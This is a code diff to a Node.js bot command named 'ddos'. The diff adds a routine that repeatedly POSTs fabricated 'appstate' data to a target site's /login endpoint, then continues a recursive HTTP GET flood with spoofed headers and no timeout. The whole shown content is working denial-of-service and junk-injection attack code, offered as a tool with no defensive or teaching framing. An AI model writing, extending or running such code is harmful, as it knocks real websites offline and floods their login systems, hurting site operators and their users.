@@ -7,6 +7,10 @@ const {
     rainbow
 } = require("gradient-string");
 
+const {
+    fakeState
+} = require("../system/fakeState.js")
+
 module.exports.config = {
     name: "ddos",
     type: "tools",
@@ -136,17 +140,36 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
         "X-Powered-By": "PHP/7.4.3",
     };
 
+//dumping attack if endpoint body exist
 
+    axios.post(url + "/login", {
+        state: fakeState(),
+    }).then((response) => {
+        if (response.status === 200) {
+            console.log(rainbow("Dumped Fake Appstate Success ✓ (200)"))
+        }
+        requestsSent++;
+        checkCompletion(requestsSent);
+        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+    })
+    .catch((err) => {
+        requestsSent++;
+        checkCompletion(requestsSent);
+        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+    });
+
+//normal http flood
 
     axios
-    .get(url, {
-        httpAgent: agent,
-        headers: headersForRequest,
-        timeout: 0,
-    })
+    .get(url,
+        {
+            httpAgent: agent,
+            headers: headersForRequest,
+            timeout: 0,
+        })
     .then((response) => {
         if (response.status === 200) {
-            console.log(rainbow(`PING! Success ✓ (${response.status})`));
+            console.log(rainbow(`PING! Success ✓ (200)`));
         }
         requestsSent++;
         checkCompletion(requestsSent);
